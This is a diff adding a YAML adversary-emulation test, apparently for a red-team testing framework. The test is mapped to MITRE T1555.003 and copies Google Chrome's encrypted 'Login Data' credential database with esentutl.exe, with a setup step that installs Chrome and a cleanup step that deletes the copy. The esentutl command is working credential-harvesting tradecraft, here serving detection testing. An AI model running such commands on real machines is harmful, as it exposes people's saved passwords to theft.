@@ -1,0 +1,40 @@
+api_version: "2.0"
+name: Dump Chrome Login Data with esentutl
+description: |
+    This test simulates an adversary using esentutl to dump encrypted credentials from Google Chrome's Login database.
+    [Reference](https://actzero.ai/resources/blog/hygiene-tip-shut-down-attackers-harvesting-cached-browser-credentials/)
+args:
+    - name: output_path
+      type: string
+      default: '%temp%\T1555.003_Login_Data.tmp'
+uuid: 70422253-8198-4019-b617-6be401b49fce
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1555: Credentials from Password Stores'
+    subtechniques:
+        - 'T1555.003: Credentials from Web Browsers'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Chrome must be installed
+      inline: |-
+        if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe") -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")) {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        $installer = "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"
+        Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
+        msiexec /i $installer /qn
+        Start-Process -FilePath "chrome.exe"
+        Stop-Process -Name "chrome"
+        }}
+      executor: powershell
+    - name: dump-chrome-login-data-with-esentutl
+      inline: |
+        esentutl.exe /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /d "{{.Args.output_path}}"
+      executor: command_prompt
+      cleanup:
+        inline: |
+            del /f /q {{.Args.output_path}} > nul 2>&1
+        executor: command_prompt
